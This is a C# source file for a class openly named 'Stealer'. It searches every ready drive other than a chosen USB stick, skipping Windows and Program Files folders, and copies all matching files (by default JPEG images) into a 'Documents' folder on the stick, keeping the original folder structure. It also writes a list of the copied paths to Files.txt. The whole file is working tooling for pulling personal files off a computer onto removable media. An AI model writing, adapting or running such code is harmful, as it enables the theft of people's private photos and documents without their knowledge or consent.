using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Logic
{
    public class Stealer
    {
        private bool success = false;
        private string tom;
        private DriveInfo usbDrive;
        private string catalogForCopy;
        private ulong count;
        private StreamWriter streamWriter;
        private DriveInfo[] drives;
        private Action<string> WriteInformation;
        private string[] Extensions = { ".jpg", ".jpeg" };
        public EventHandler<CountFilesEventArgs> CountFilesChanged;
        public EventHandler<DriveInformationEventArgs> DriveChanged;

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives)
        {
            if (usbDrive is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(usbDrive)));
            }
            if (Drives is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(Drives)));
            }

            this.usbDrive = usbDrive;
            drives = Drives;
        }

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives, string[] Extensions) : this (usbDrive, Drives)
        {
            if (Extensions is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(Extensions)));
            }

            this.Extensions = Extensions;
        }

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives, Action<string> WriteInformation) : this(usbDrive, Drives)
        {
            if (WriteInformation is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(WriteInformation)));
            }

            this.WriteInformation = WriteInformation;
        }

        public Stealer(DriveInfo usbDrive, DriveInfo[] Drives, string[] Extensions, Action<string> WriteInformation) : this(usbDrive, Drives, Extensions)
        {
            if (WriteInformation is null)
            {
                throw new ArgumentNullException(String.Format("{0} is null", nameof(WriteInformation)));
            }

            this.WriteInformation = WriteInformation;
        }

        public void Steal()
        {
            foreach (DriveInfo drive in drives)
            {
                if (drive.IsReady && drive.VolumeLabel == usbDrive.VolumeLabel)
                {
                    tom = drive.Name;
                    if (!Directory.Exists(@tom + "Documents")) Directory.CreateDirectory(@tom + "Documents");
                    streamWriter = new StreamWriter(@tom + "Files.txt", false, System.Text.Encoding.Default);
                    foreach (DriveInfo currentDrive in drives)
                    {
                        try
                        {
                            if (currentDrive.IsReady && currentDrive.Name != tom)
                            {
                                DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} {1} is checking\n", drive.Name, drive.VolumeLabel)));
                                DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("About drive:\n\tDrive Format: {0}\n\tDrive Type: {1}\n\tTotal Size: {2}", drive.DriveFormat, drive.DriveType, drive.TotalSize)));

                                Search(currentDrive.Name);
                                DriveChanged?.Invoke(this, new DriveInformationEventArgs(String.Format("Drive {0} is checked. Found {1} files", drive.Name, count)));
                                count = 0;
                            }
                            DriveChanged?.Invoke(this, new DriveInformationEventArgs("Drive " + drive.Name + " is skiped. \nAbout drive:\n\tDrive Format: " + drive.DriveFormat + "\n\tDrive Type: " + drive.DriveType + "\n\tTotal Size: " + drive.TotalSize + "\n\tDrive status: " + (drive.IsReady ? "Ready" : "Isn't Ready")));
                        }
                        catch (System.IO.IOException) { }
                        catch (System.NullReferenceException) { }
                    }
                    success = true;
                }

            }

            if (!success) WriteInformation("Flash card isn't found. Please insert it and try again.");
            try
            {
                streamWriter.Close();
            }
            catch (System.NullReferenceException) { }
            catch (System.IO.IOException) { }; //"Out of memory... "
        }

        private void Search(string path)
        {
            bool isCheking = true;
            if (path.Contains("Program Files") || path.Contains("Windows") || path.Contains("Program Files (x86)")) isCheking = false;
            if (isCheking)
            {
                string[] directories = Directory.GetDirectories(path);
                foreach (string directory in directories)
                {
                    try
                    {
                        foreach (string extension in Extensions)
                        {
                            string[] files = Directory.GetFiles(directory, extension, SearchOption.AllDirectories);
                            foreach (string fullFileName in files)
                            {
                                FileInfo file = new FileInfo(fullFileName);
                                try
                                {
                                    catalogForCopy = @tom + "Documents\\" + directory.Substring(3) + "\\";
                                    if (!Directory.Exists(catalogForCopy))
                                    {
                                        Directory.CreateDirectory(catalogForCopy);
                                    }
                                    file.CopyTo(catalogForCopy + file.Name, false);
                                }
                                catch (System.IO.IOException) { }

                                streamWriter.WriteLine(fullFileName);
                                WriteInformation(fullFileName);
                                count++;
                                CountFilesChanged?.Invoke(this, new CountFilesEventArgs(count));
                            }
                        }

                        Search(directory);
                    }
                    catch (System.UnauthorizedAccessException) { }
                }
            }
        }
    }
}
